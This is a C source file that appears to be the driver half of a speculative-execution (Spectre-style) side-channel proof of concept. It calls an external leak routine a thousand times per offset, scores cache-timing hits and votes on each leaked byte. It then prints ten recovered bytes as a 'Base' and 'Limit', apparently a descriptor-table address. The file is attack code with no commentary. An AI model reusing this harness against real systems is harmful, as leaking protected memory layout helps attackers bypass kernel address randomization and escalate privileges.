#include <stdio.h>
#include <limits.h>
#include <string.h>

#if CHAR_BIT != 8
    #error CHAR_BIT MUST BE 8
#endif


extern unsigned int timings[256];
extern void leak(unsigned int off);

void find_vals(unsigned int scores[256])
{
    unsigned int i;

    for (i = 0; i < 256; i++)
    {
        if (timings[i] >= 110)
            continue;
        
        //printf("Incrementing %x (act. %d)\n", i, scores[i]);
        scores[i]++;
    }
}

unsigned int find_max(unsigned int scores[256])
{
    unsigned int i;
    unsigned int max = 0, duplicated = 0;
    unsigned int val = 0x100;

    for (i = 0; i < 256; i++)
    {
        if (scores[i] == max)
        {
            duplicated = 1;
            val = i;
        }

        if (scores[i] > max)
        {
            duplicated = 0;
            max = scores[i];
            val = i;
        }
    }

    return duplicated ? 0x100 : val;
}

void print_byte(unsigned int x)
{
    if (x >= 0x100)
        printf("XX");
    else
        printf("%02x", x);
}

unsigned int scores[256] = {0};

int main()
{
    int i = 0;
    unsigned int off=0;
    int bytes[10];

    
    /*leak(0);
    leak(1);
    for (int j = 0; j < 256; j++) { if (j % 16 == 0) printf("\n"); printf("  %3d", timings[j]); }
    printf("\n\n");
    find_vals(scores);
    for (int j = 0; j < 256; j++) { if (j % 16 == 0) printf("\n"); printf("  %3d", scores[j]); }
    return 1;
*/

    for (; off < 10; off++)
    {
        memset(scores, 0, sizeof(scores));
        i = 0;
        /* Test specpoline */
        while (i++ < 1000)
        {    
          leak(off);
          find_vals(scores);
        }

        //for (int j = 0; j < 256; j++) printf("  %d", scores[j]);
        

        bytes[off] = find_max(scores);

        //printf("Voted for %x\n", bytes[off]);
        //scanf("%*c");
    }



    /* Show results */
    printf("Base: "); 
      print_byte(bytes[9]);
      print_byte(bytes[8]);
      print_byte(bytes[7]);
      print_byte(bytes[6]);
      print_byte(bytes[5]);
      print_byte(bytes[4]);
      print_byte(bytes[3]);
      print_byte(bytes[2]);
    printf("\nLimit: ");
      print_byte(bytes[1]);
      print_byte(bytes[0]);
    
    printf("\n\n");

    return 0;    
}
